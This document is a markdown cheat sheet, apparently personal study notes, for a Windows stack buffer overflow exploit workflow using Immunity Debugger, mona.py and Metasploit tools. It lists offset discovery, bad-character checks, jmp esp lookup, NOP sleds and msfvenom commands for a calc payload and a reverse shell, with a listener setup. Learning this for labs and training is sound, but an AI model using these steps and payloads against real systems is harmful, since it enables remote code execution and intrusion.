### Buffer overflow overview
  1. Trigger bug by sending lots of A's down the wire.
  2. Expect a crash at `0x41414141`

### Discover Offsets
  1. `pattern_create.rb` --> send to overflow buffer string
    * Max of 20280 chars in length
  3. `!mona findmsp` || `pattern_offset.rb`

### Test Offsets
  1. send `("A" * offset) + "BBBB" + "CCCC"`
      * `EIP` should land on `"BBBB" `

### Discover bad characters
1. `!mona config -set workingfolder C:\logs\%p`
2. `!mona bytearray -cpb "\x00\x0a"`
    * generate byte array without bad characters
3. `!mona cmp -f c:\logs\program\bytearray.bin -a <start_addr>`
    * verify by sending a byte array without the bad chars
4. `msfvenom ... -b '\x00\x0a' `
    * generate shellcode without bad chars

### Find place to put shellcode
* overwrite EIP (saved return pointer) with a jmp address 
  * `ret` in exploit script
* !mona jmp -r esp -cbp "\x00\x0a"
  * ESP is usually after saved return pointer overwrite
  * remember to put memory location in little endian
    * `ret = struct.pack('<L', esp)` - python conversion

### Test for execution
* use INT3 breakpoint `\xcc` in place of shellcode to test for exec
  * debugger should stop here

### Try to pop calc
* Generate shellcode
* https://www.offensive-security.com/metasploit-unleashed/binary-payloads/ - msfvenom syntax
  * `msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b '\x00\x0a' -f python`

### NOP sled
* shellcode may need a bigger target to hit
  * `\x90`
  * `\x83\xec\x10`
    * sub eax,0x10
      * uses less buffer space
`* msfvenom ... -n 16`
  * use msfvenom to auto generate a nop sled

### Generate Shellcode for a reverse shell
* `msfvenom -a x86 -p windows/shell_reverse_tcp -b '\x00\x0a' -f python`
* `windows/shell/reverse_tcp` uses meterpreter multi-stage handler, must use `msfconsole` to connect
  
  
    use mutli/handler
    set payload windows/shell/reverse_tcp
    exploit
    

* regular `nc -nvlp` reverse shell
  * `windows/shell_reverse_tcp`


### Misc Notes
* sometimes you need to send `\n` and/or `\r` after the payload so the vuln program will parse it 
* use `mona.py`, `immunity debugger`
  * other programs that may be helpful
    * `gdb`
    * `radare2`
    * `hopper`
    * `ida pro` 
